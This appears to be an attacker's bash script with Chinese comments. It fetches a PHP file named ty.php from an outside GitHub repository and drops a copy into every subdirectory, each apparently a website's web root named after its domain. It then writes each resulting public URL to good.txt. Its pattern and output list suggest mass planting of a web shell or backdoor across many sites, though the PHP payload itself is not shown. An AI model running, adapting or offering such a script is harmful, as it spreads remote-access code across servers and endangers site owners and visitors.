#!/bin/bash

base_dir="$(pwd)"
source_url="https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php"

for dir in */; do
    dirname=${dir%/}
    target_file="${base_dir}/${dirname}/ty.php"
    
    echo "Checking $dirname..."
    
    # 使用 curl 下载（更可靠）
    if curl -L -f -s -S "$source_url" -o "$target_file"; then
        if [ -s "$target_file" ]; then
            echo "  ✓ Downloaded to ${dirname}/ty.php"
            url="https://${dirname}/ty.php"
            echo "$url" >> good.txt
        else
            echo "  ✗ Downloaded file is empty"
        fi
    else
        echo "  ✗ Download failed for $dirname"
        # 显示 curl 错误
        curl -L -f "$source_url" -o "$target_file" --verbose
    fi
done
